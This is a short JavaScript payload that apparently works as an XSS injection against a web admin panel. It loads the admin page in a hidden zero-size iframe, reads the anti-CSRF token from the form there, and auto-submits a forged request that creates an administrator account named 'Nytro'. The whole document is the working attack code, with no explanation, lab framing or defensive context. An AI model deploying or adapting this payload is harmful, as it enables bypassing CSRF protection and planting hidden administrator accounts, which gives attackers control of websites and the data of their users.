document.writeln('<iframe id="iframe" src="/admin/admin.php?action=add_admin" width="0" height="0" onload="read()"></iframe>');

function read() {

    var name = 'Nytro';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    
    document.writeln('<form width="0" height="0" method="post" action="/admin/add_admin.php">');
    document.writeln('<input type="text" name="name" value="' + name + '" /><br />');
    document.writeln('<input type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Add_admin" /><br />');
    document.writeln('</form>');
    document.forms[0].submit.click();
    
}
